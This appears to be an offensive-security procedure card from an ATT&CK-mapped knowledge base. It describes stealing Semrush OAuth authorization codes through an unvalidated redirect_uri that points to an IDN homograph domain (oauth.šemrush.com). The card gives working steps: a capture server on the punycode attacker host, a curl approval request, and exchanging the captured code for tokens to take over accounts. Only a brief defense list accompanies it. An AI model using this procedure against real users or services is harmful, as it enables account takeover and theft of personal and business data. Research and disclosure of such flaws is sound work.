---
id: proc-semrush-approve-capture-001
name: Approve-OAuth-Flow-and-Capture-Authorization-Code
type: procedure
verified: false
submitted: true
created_at: '2024-09-18T12:00:00Z'
updated_at: '2025-12-14T17:24:39.205Z'
tactics:
  - '[[Initial Access]]'
techniques:
  - '[[Valid Accounts]]'
sub_techniques: []
tags:
  - oauth
  - code-capture
  - account-takeover
commands:
  - '[[commands/python-http-server]]'
platforms:
  - Web
tools: []
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---

# Approve-OAuth-Flow-and-Capture-Authorization-Code

## Summary

This procedure completes the Semrush OAuth flow by approving the authorization request, resulting in the redirection of the authorization code to the attacker-controlled IDN homograph domain for capture and subsequent token exchange.

## Description

Following URL construction, the victim (or simulated user) approves the OAuth scopes, triggering the backend to issue and redirect an authorization code via the unvalidated redirect_uri. The homograph domain ('oauth.šemrush.com') captures the code in the query parameter. With the code, the attacker can exchange it for an access token via the token endpoint, gaining access to user data like ID, email, projects, and site audits. This exploits the lack of IDN normalization, allowing homographs like 'šemrush.com', 'sémrush.com' to pass as 'semrush.com'.

## Requirements

1. Active OAuth approval page from previous step.
2. Attacker server running on the registered homograph domain (e.g., port 443 for HTTPS).
3. Victim interaction: Approval of scopes (user.info, projects.info, siteaudit.info).
4. Access to /oauth2/token endpoint for code exchange post-capture.

## Defense

Defensive measures and detection strategies:

- Enforce HTTPS-only redirects and validate certificate chains against exact domains.
- Log and alert on OAuth approvals with non-standard redirect_uris or IDN usage.
- Implement rate limiting on OAuth endpoints and monitor for homograph patterns in logs.
- Use allowlists for redirect_uris limited to exact registered domains.

## Objectives

1. Obtain the OAuth authorization code through redirection.
2. Enable token exchange for unauthorized access to Semrush account data.
3. Demonstrate full account compromise via leaked credentials.

## Instructions

### Step 1: Set Up Capture Server

**Context**: Host a server on the homograph domain to log incoming redirects and capture the code.

**Command** ([[commands/python-http-server]]):
```bash
python3 -m http.server 80 --bind 0.0.0.0  # Run on server at oauth.xn--emrush-9jb.com; use 443 for HTTPS
```

> Starts a basic HTTP server. Access logs will show the GET request with ?code=AUTH_CODE upon redirect.

### Step 2: Approve and Observe Redirect

**Context**: In a browser, approve the OAuth request to trigger the code issuance and redirection.

**Command** ([[commands/curl-approve-simulate]]):
```bash
# Simulate approval via form submission if automated; otherwise manual browser approval
curl -X POST "https://oauth.semrush.com/oauth2/authorize" -d "approve=1" -b cookies.txt -v
```

> Submits approval; expected redirect to 'https://oauth.šemrush.com/oauth2/success?code=abc123...'. Capture the code from server logs.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Valid Accounts]] Valid Accounts

### Sub-Techniques


## Commands Used

- [[commands/python-http-server]]

## Tools Used


## Tags

- oauth
- code-capture
- account-takeover
